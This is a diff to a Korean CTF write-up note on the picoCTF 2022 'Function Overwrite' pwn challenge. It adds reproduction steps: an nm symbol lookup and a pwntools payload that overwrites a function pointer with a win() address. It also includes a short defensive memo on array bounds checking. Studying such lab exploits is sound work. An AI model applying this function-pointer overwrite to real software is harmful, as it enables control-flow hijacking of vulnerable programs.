@@ -1,7 +1,7 @@
 ---
 title: Function Overwrite — picoCTF 2022 pwn writeup
 created: 2026-06-15
-updated: 2026-06-15
+updated: 2026-06-16
 type: query
 tags: [ctf, pwn, arbitrary-write, function-pointer, out-of-bounds, picoctf]
 sources: [https://picoctf2022.haydenhousen.com/binary-exploitation/function-overwrite, https://cryptocat.me/blog/ctf/2022/pico/pwn/function_overwrite/]
@@ -78,6 +78,23 @@ print(io.recv().decode(errors='ignore'))
 - 함수 포인터는 작은 델타만 더해도 다른 함수로 바꿀 수 있습니다.
 - 결과적으로 **임의 주소 쓰기처럼 보이는 원시 원자성**을 얻습니다.
 
+
+## 재현 절차
+
+1. 덮어쓸 함수 포인터와 목표 함수를 확인합니다.
+```bash
+# 심볼과 함수 배치를 먼저 확인합니다.
+nm -n ./vuln | grep -E "win|func|target"  # 예상: 관련 심볼 주소가 출력됩니다.
+```
+2. 입력으로 함수 포인터를 덮어쓰는 페이로드를 만듭니다.
+```python
+# 함수 포인터 overwrite의 기본 형태입니다.
+from pwn import *
+payload = b"A" * 64          # 예시: 포인터 위치까지 채웁니다.
+payload += p32(0x080491f6)    # 예시: win() 주소입니다.
+print(payload)
+```
+3. overwrite 후 목표 함수가 실행되는지 확인합니다.
 ## 7. 방어 관점 메모
 
 - 배열 인덱스는 하한/상한 모두 검사해야 합니다.
